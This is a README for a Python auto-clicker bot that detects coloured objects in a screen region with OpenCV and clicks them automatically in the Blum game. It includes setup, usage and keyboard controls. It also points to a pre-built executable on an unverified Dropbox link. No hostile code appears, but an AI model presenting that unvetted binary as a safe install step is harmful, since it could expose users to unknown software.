# Blum AutoClicker Bot

## Overview

Blum AutoClicker Bot is a Python-based auto-clicker tool designed to interact with specific colored objects within a defined region of the screen. It detects objects of specific colors, such as pink, green, and bomb-like objects, and interacts with them by simulating mouse clicks. It features a PyQt5 overlay window to visualize the detection area and uses color detection with OpenCV to avoid interacting with bomb-like objects.

## Features

1. **Color Detection**: Detects pink and green objects on the screen within a defined region.
2. **Bomb Avoidance**: Avoids interaction with bomb-like objects within proximity.
3. **Mouse Click Automation**: Automatically clicks on detected objects based on color.
4. **PyQt5 Overlay**: Displays an on-screen overlay marking the detection area.
5. **User Control**: Allows the user to start/stop the bot with keyboard inputs.

## Installation

### Option 1: Run the Executable

Download and run the pre-built executable version of the bot from the following link:

[Download Blum AutoClicker Bot Executable](https://www.dropbox.com/scl/fo/h4lass4z938q4hz0rfc6e/APRlajID3Vwg2pru7rV6Wl0?rlkey=4weyid6j77epchsr0bnh6esjx&st=qstmewnb&dl=0)

No installation of Python or dependencies is required.

### Option 2: Run from Source

1. Clone the repository:
    ```bash
    git clone https://github.com/username/blum-autoclicker-bot.git
    cd blum-autoclicker-bot
    ```

2. Install the required dependencies using pip:
    ```bash
    pip install -r requirements.txt
    ```

3. Install the following dependencies manually if required:
    ```bash
    pip install PyQt5 mss opencv-python keyboard mouse decouple
    ```

## Usage

1. Place the coordinates of the region to be monitored in the `window_coordinates.txt` file:
    ```bash
    start_x=100
    end_x=600
    start_y=100
    end_y=400
    ```

2. Run the bot:
    ```bash
    python main.py
    ```

3. Controls:
    - Press `s` to start the bot.
    - Press `p` to stop the bot.
    - Press `Ctrl + C` to exit the program.